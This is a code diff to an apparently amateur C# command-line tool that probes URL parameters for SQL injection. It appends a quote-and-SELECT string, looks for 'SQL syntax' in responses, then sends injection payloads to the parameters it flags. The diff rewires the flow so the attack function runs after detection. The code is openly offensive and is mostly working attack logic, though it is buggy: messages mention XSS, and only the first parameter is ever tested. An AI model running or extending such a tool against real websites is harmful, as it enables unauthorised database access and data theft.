@@ -54,13 +54,13 @@ namespace asemoncms3
 
 
             string[] sqliResult = SQLI(parameters, url);
-
-            SqlinjectionAttempt(url, sqliResult);
-
+            var sqliVunParameters = sqliResult;
 
 
 
-            if (sqliResult.Contains("No parameters were found"))
+
+
+            if (sqliResult.Contains("No parameters were found to be vulnerable to SQLI attempts"))
             {
                 Console.WriteLine("Application does not seem to be vulnerable to XSS injection in parametrs given.\n" +
                     "Would you like to try a different url?(Y for yes N for No)");
@@ -78,7 +78,11 @@ namespace asemoncms3
                     System.Environment.Exit(0);
                 }
             }
-            var sqliVunParameters = sqliResult;
+
+            SqlinjectionAttempt(url, sqliVunParameters);
+
+            Console.WriteLine("Goodbye...");
+            System.Environment.Exit(0);
 
             static void SqlinjectionAttempt(string url, string[] parameters)
             {
@@ -102,6 +106,8 @@ namespace asemoncms3
                 {
                     foreach (string parms in parameters)
                     {
+                        if (String.IsNullOrEmpty(parms))
+                            return;
                         string sqliURL = url.Replace(parms, parms + Uri.EscapeUriString(payload));
                         Console.WriteLine($"{sqliURL}");
                         HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(sqliURL);
@@ -128,6 +134,7 @@ namespace asemoncms3
             string httpURL;
             if (!url2Test.Contains("http://"))
             {
+                Console.WriteLine("Missing protocol \n Adding http:// to url");
                 httpURL = "http://" + url2Test;
                 url2Test = httpURL;
             }
@@ -143,33 +150,37 @@ namespace asemoncms3
             string[] vulnParms = new string[i];
             string NoVulnParameters = "No Vuln parameters found..or end of code reached";
 
-            foreach (string s in sqliParams)
+            for (int j = 0; j < i; j++)
             {
-                string sqli = url.Replace(s, s + "'SELECT *");
-                Console.WriteLine($"Testing {sqli} for SQLI Vulnerability");
-
-                HttpWebRequest sqliWebRequest = (HttpWebRequest)WebRequest.Create(sqli);
-                sqliWebRequest.Method = "GET";
-
-                string sqliResp = string.Empty;
-                using (StreamReader rdr = new
-                    StreamReader(sqliWebRequest.GetResponse().GetResponseStream()))
+                foreach (string s in sqliParams)
                 {
-                    sqliResp = rdr.ReadToEnd();
-                }
-                if (sqliResp.Contains("SQL syntax"))
-                {
-                    Console.WriteLine("**\nFOUND POSSIBLE SQL INJECTION in " + s + "\n**");
-                    isVuln = true;
-                    vulnParms = sqliParams;
-                    return vulnParms;
-                }
-                else if (!sqliResp.Contains("SQL syntax"))
-                {
-                    Console.WriteLine(noVulnParams);
-                    return new[] { noVulnParams };
-                }
+                    string sqli = url.Replace(s, s + "'SELECT *");
+                    Console.WriteLine($"Testing {sqli} for SQLI Vulnerability");
 
+                    HttpWebRequest sqliWebRequest = (HttpWebRequest)WebRequest.Create(sqli);
+                    sqliWebRequest.Method = "GET";
+
+                    string sqliResp = string.Empty;
+                    using (StreamReader rdr = new
+                        StreamReader(sqliWebRequest.GetResponse().GetResponseStream()))
+                    {
+                        sqliResp = rdr.ReadToEnd();
+                    }
+                    if (sqliResp.Contains("SQL syntax"))
+                    {
+                        Console.WriteLine("**\nFOUND POSSIBLE SQL INJECTION in " + s + "\n**");
+                        isVuln = true;
+                        vulnParms[j] = s;
+                        return vulnParms;
+                    }
+                    else if (!sqliResp.Contains("SQL syntax"))
+                    {
+                        Console.WriteLine(noVulnParams);
+                        return new[] { noVulnParams };
+                    }
+                   
+
+                }
             }
             return new[] { NoVulnParameters };
 
